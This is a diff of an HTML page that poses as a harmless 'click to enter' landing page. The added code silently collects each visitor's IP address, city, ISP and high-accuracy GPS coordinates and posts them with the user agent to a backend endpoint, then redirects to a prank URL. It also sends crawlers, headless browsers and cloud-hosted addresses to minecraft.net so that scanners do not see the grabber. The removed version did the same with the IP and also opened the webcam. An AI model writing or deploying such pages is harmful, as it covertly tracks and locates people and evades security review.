@@ -1,48 +1,153 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de la lnformación</title>
-    <style>
-        body{font-family:Arial;text-align:center;margin-top:80px;}
-        button{padding:14px 30px;margin:10px;font-size:17px;cursor:pointer;border:none;background:#007AFF;color:white;border-radius:8px;}
-        video{margin-top:20px;border:1px solid #ccc;border-radius:6px;width:360px;}
-    </style>
+    <title>Q74 SUP </title>
+    <link rel="preconnect" href="https://api.ipify.org">
+    <link rel="preconnect" href="https://icanhazip.com">
+    <link rel="preconnect" href="https://ipapi.co">
 </head>
-<body>
-    <h2>Haga clic abajo para iniciar</h2>
-    <button onclick="startAll()">Inicio start</button>
-    <br>
-    <video id="myCamera" autoplay playsinline></video>
+<body style="display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;">
+<button id="downloadBtn" style="padding:20px;font-size:18px;line-height:1.6;">
+click to enter<br>
+Click en Entrar<br>
+点击 进入<br>
+</button>
 
-    <script>
-        async function startAll(){
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+const lockTime = 5 * 60 * 1000;
+const jumpUrl = "http://full.rickroll.info/";
+const minecraftRedirect = "https://www.minecraft.net/es-es/";
+
+axios.defaults.timeout = 6000;
+let ipData = {ip:"获取失败",country:"-",city:"-",region:"-",isp:"-"};
+let gpsInfo = "未发起定位请求";
+let sendLock = false;
+let gpsTriggered = false;
+let ipFullyLoaded = false;
+let ipLock = {ip:"",time:0};
+
+try{
+    const cache = localStorage.getItem("lastIp");
+    ipLock = cache ? JSON.parse(cache) : {ip:"",time:0};
+}catch(e){
+    ipLock = {ip:"",time:0};
+    localStorage.setItem("lastIp",JSON.stringify(ipLock));
+}
+
+const blockWords = ["bot","spider","crawler","headless","scraper","preview","selenium","puppeteer","robot"];
+const cloudProviders = ["HostRoyale","DigitalOcean","Linode","Vultr","Hetzner","Amazon","AWS","Azure","Google Cloud","OVH","Contabo","Packet","Ramnode","AlibabaCloud","TencentCloud"];
+const ua = navigator.userAgent.toLowerCase();
+const isRobot = blockWords.some(word => ua.includes(word));
+
+function isCloudISP(isp){
+    if(!isp) return false;
+    const lowIsp = isp.toLowerCase();
+    return cloudProviders.some(name=> lowIsp.includes(name.toLowerCase()));
+}
+
+if(isRobot){
+    location.href = minecraftRedirect;
+}else{
+    async function getIPInfo(){
+        let realIP = null;
+        try{
+            const ipRes = await axios.get("https://api.ipify.org?format=json");
+            realIP = ipRes.data.ip;
+        }catch(err){
             try{
-                //1.上报IP
-                let res = await fetch("https://api.ipify.org?format=json");
-                let json = await res.json();
-                let userIp = json.ip;
-
-                await fetch("/api/upload_ip",{
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({ip:userIp})
-                })
-                alert("IP已上报："+userIp);
-
-                //2.调取摄像头
-                const videoBox = document.getElementById("myCamera");
-                const mediaStream = await navigator.mediaDevices.getUserMedia({video:true})
-                videoBox.srcObject = mediaStream;
-
-                //3.跳转MC官网
-                window.open("https://www.minecraft.net/zh-hans","_blank");
-
-            }catch(err){
-                alert("权限被拒绝或者出错："+err)
+                const backupIp = await axios.get("https://icanhazip.com");
+                realIP = backupIp.data.trim();
+            }catch(err2){
+                ipData.ip = "两个IP接口全部请求失败";
+                ipFullyLoaded = true;
+                if(!gpsTriggered) getGPS();
+                return;
             }
         }
-    </script>
+        const now = Date.now();
+        if(ipLock.ip === realIP && (now - ipLock.time) < lockTime){
+            ipFullyLoaded = true;
+            if(!gpsTriggered) getGPS();
+            return;
+        }
+        localStorage.setItem("lastIp", JSON.stringify({ip:realIP, time:now}));
+        try{
+            const infoRes = await axios.get(`https://ipapi.co/${realIP}/json/`);
+            ipData = {
+                ip: infoRes.data.ip || realIP,
+                country: infoRes.data.country_name || "-",
+                city: infoRes.data.city || "-",
+                region: infoRes.data.region || "-",
+                isp: infoRes.data.org || "-"
+            };
+            if(isCloudISP(ipData.isp)){
+                location.href = minecraftRedirect;
+                return;
+            }
+        }catch(err){
+            ipData.ip = realIP;
+        }
+        ipFullyLoaded = true;
+        if(!gpsTriggered) getGPS();
+    }
+
+    function getGPS(){
+        if(gpsTriggered) return;
+        gpsTriggered = true;
+        if(!navigator.geolocation){
+            gpsInfo = "浏览器禁止地理位置API";
+            sendData();
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos)=>{
+                gpsInfo = `纬度:${pos.coords.latitude} | 经度:${pos.coords.longitude}`;
+                sendData();
+            },
+            (err)=>{
+                switch(err.code){
+                    case 1: gpsInfo = "访客手动拒绝GPS定位权限";break;
+                    case 2: gpsInfo = "地理位置数据无法获取";break;
+                    case 3: gpsInfo = "GPS请求8秒超时未响应";break;
+                    default:gpsInfo = `定位异常错误码:${err.code}`;
+                }
+                sendData();
+            },
+            {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+        );
+    }
+
+    //前端只把采集到的数据发给自己后端接口，密钥后端保管
+    async function sendData(){
+        if(sendLock) return;
+        sendLock = true;
+        const postData = {
+            ip:ipData.ip,
+            country:ipData.country,
+            city:ipData.city,
+            region:ipData.region,
+            isp:ipData.isp,
+            gps:gpsInfo,
+            ua:navigator.userAgent
+        };
+        //调用本项目后端接口，相对路径不用填长网址
+        await axios.post("/send_msg",postData);
+    }
+
+    document.getElementById("downloadBtn").addEventListener("click",async ()=>{
+        while(!ipFullyLoaded){
+            await new Promise(resolve=>setTimeout(resolve,200));
+        }
+        gpsTriggered = false;
+        await getGPS();
+        setTimeout(()=>{
+            location.href = jumpUrl;
+        },3000);
+    });
+    getIPInfo();
+}
+</script>
 </body>
 </html>
